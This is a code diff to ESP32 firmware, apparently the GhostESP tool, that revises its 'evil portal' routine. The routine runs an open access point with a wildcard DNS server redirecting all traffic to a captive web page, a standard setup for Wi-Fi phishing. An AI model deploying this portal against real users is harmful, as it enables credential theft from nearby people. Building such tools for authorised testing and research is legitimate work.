@@ -777,7 +777,7 @@ httpd_handle_t start_portal_webserver(void) {
     return evilportal_server;
 }
 
-void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid, const char* domain)
+esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid, const char* domain)
 {
 
     if (strlen(URL) > 0 && strlen(domain) > 0)
@@ -845,28 +845,51 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
 
         start_portal_webserver();
 
+        // Configure DNS server to handle both regular and .local domains
         dns_server_config_t dns_config = {
-            .num_of_entries = 1,
+            .num_of_entries = 3,
             .item = {
                 {
                     .name = "*", 
+                    .if_key = NULL, 
+                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
+                },
+                {
+                    .name = "ghostesp", 
+                    .if_key = NULL, 
+                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
+                },
+                {
+                    .name = "ghostesp.local",
                     .if_key = NULL, 
                     .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
                 }
             }
         };
 
-        // Start the DNS server with the configured settings
+        // Start DNS server
         dns_handle = start_dns_server(&dns_config);
         if (dns_handle) {
-            printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
+            ESP_LOGI(TAG, "DNS server started, handling all requests including ghostesp.local");
         } else {
-            printf("Failed to start DNS server\n");
+            ESP_LOGE(TAG, "Failed to start DNS server");
+            return ESP_FAIL;
         }
+
+        // Configure DHCP to offer our DNS server
+        esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, 
+                              &dhcps_dns_value, sizeof(dhcps_dns_value));
+
+        // Set DNS server info
+        esp_netif_dns_info_t dns_info = {
+            .ip.u_addr.ip4.addr = ESP_IP4TOADDR(192, 168, 4, 1),
+            .ip.type = ESP_IPADDR_TYPE_V4
+        };
+        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dns_info);
     }
     else 
     {
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP) );
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
         strlcpy((char*)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
         ap_config.ap.authmode = WIFI_AUTH_OPEN;
 
@@ -877,7 +900,7 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
         dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
         esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
 
-        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config) );
+        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
 
         ESP_ERROR_CHECK(esp_wifi_start());
 
@@ -902,6 +925,8 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
             printf("Failed to start DNS server\n");
         }
     }
+
+    return ESP_OK;  // Add return value at the end
 }
 
 
@@ -2009,6 +2034,7 @@ void wifi_manager_connect_wifi(const char* ssid, const char* password) {
             TERMINAL_VIEW_ADD_TEXT("Connection successful!\n");
         }
     }
+
 }
 
 void wifi_beacon_task(void *param) {
